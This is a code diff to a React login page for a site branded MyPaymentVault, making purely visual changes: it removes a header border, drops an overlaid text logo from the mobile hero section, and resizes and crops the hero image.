@@ -136,7 +136,7 @@ export default function Login() {
           }
           .login-card-header {
             padding: 14px 16px !important;
-            border-bottom: 1px solid #f0f0f0 !important;
+            border-bottom: none !important;
           }
           .login-card-header .lang-btn { display: block !important; }
           .login-card-header .lang-btn button span { display: none !important; }
@@ -504,17 +504,9 @@ export default function Login() {
             className="login-form-col"
             style={{ width: "42%", padding: "44px 20px 28px 34px", background: "transparent", position: "relative", zIndex: 2 }}
           >
-            {/* HERO IMAGE — mobile only (logo di dalam section gelap seperti real site) */}
-            <div className="login-hero-mobile" style={{ display: "none", lineHeight: 0, margin: "0 -20px 16px", width: "calc(100% + 40px)", position: "relative" }}>
-              {/* Logo overlaid di atas hero image */}
-              <div className="login-mobile-logo" style={{ display: "none", position: "absolute", top: 16, left: 20, zIndex: 10 }}>
-                <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#fff" }}>
-                  <span style={{ fontWeight: 300 }}>MY</span>
-                  <span style={{ fontWeight: 700 }}>PAYMENT</span>
-                  <span style={{ fontWeight: 300 }}>VAULT</span>
-                </span>
-              </div>
-              <img src="/hero-mobile-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
+            {/* HERO IMAGE — mobile only */}
+            <div className="login-hero-mobile" style={{ display: "none", lineHeight: 0, margin: "0 -20px 20px", width: "calc(100% + 40px)", position: "relative", background: "#1a1a1a", overflow: "hidden", height: 260 }}>
+              <img src="/hero-mobile-new.png" alt="MyPaymentVault" style={{ width: "100%", height: "120%", objectFit: "cover", objectPosition: "60% 15%", display: "block" }} />
             </div>
 
             <h2 className="login-heading" style={{ fontSize: 18, fontWeight: 400, color: "#111", marginBottom: 6 }}>
